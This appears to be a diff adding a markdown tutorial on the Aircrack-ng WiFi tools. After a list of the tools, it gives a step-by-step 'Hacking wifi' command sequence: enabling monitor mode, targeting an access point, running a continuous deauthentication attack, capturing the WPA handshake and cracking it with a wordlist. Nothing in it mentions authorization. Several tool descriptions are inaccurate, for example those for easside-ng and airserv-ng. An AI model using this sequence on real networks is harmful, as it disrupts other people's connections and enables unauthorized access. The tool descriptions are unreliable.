@@ -1,0 +1,143 @@
+# Introduction
++ Aircrack-ng a suite of tools to access WiFi network security including: monitoring, attacking, testing, and cracking.
++ The suite tests the strength of passwords used for wireless networks.
+
+## Package
+
+1. **aircrack-ng** : This is the main tool used for cracking WEP and WPA/WPA2-PSK keys. It analyzes captured packets and attempts to recover the network key.
+2. **aireplay-ng** : This tool is used for packet injection. It can be used to generate traffic for cracking WEP and WPA-PSK keys or for other wireless attacks like deauthentication attacks.
+3. **airmon-ng** : Used for enabling and disabling monitor mode on wireless interfaces. Monitor mode is necessary for many wireless attacks.
+4. **airodump-ng** : This tool is used for capturing packets from wireless networks. It can be used to gather information about nearby wireless networks, including their SSIDs, MAC addresses, signal strength, and encryption type.
+5. **packetforge-ng** : This tool is used for creating custom packets. It's often used in conjunction with aireplay-ng for crafting specific types of packets for wireless attacks.
+6. **ivstools** : This set of tools is used for manipulating IVs (Initialization Vectors) in captured packets. IVs are used in WEP encryption and are essential for cracking WEP keys.
+7. **airserv-ng** : This is an access point simulator. It's used for creating virtual access points for testing purposes.
+8. **easside-ng** : This tool is used for attacking WPA-PSK networks. It exploits weak EAPOL-Key RC4 encryption keys.
+9. **tkiptun-ng** : This tool exploits flaws in TKIP encryption to inject arbitrary packets into a WPA-PSK network.
+10. **wesside-ng** : his tool is used for cracking WEP keys. It performs an active attack against the target network to obtain enough data for cracking the WEP key.
+11. **makeivs-ng** : This tool is used for generating IVs (Initialization Vectors) for WEP cracking. IVs are necessary for the aircrack-ng tool to attempt to crack the WEP key.
+12. **airdecap-ng** : This tool is used for decrypting WEP and WPA/WPA2-PSK encrypted network traffic.
+
+# Hacking wifi
+
++ You can check the wifi adapter using this command
+```bash
+iwconfig
+
+OR
+
+ip addr
+
+OR
+
+ifconfig
+```
+
++ To check any conflict process and kill them
+```bash
+sudo airmon-ng check kill
+```
+
++ Start monitor mode
+```bash
+sudo airmon-ng start <adapter_name>
+```
+
++ Verify that monitor mode is used
+```bash
+sudo airmon-ng
+```
+
++ Get the AP's MAC address and channel
+```bash
+sudo airodump-ng <adapter_name>
+```
+
+> [!NOTE]
+> AP-MAC & channel-you need to select your own here:
+>    + ESSID: 90:9A:4A:B8:F3:FB
+>    + Channel used by AP for SSID: 2
+
++ Filter to only show the SSID we want to attack
+```bash
+sudo airodump-ng <adapter_name> -d <bssid_selected>
+```
+
++ `1st window`: Make sure you replace the channel number and bssid with your own.
+```bash
+sudo airodump-ng -w <fileToStoreData> -c <channel_number> --bssid <bssid_selected> <adapter_name>
+```
+
++ `2nd Window`: Deauth attack.
+```bash
+sudo aireplay-ng --deauth 0 -a <bssid_selected> <adapter_name>
+```
+
++ Use Wireshark to open hack file.
+```bash
+wireshark <filename>.cap
+```
+
++ Filter Wireshark message for EAPOL.
+```bash
+eapol
+```
+
++ Stop monitor mode.
+```bash
+airmon-ng stop <adapter_name>
+```
+
++ Crack file with any wordlist
+```bash
+aircrack-ng <filename>.cap -w /usr/share/wordlists/rockyou.txt
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
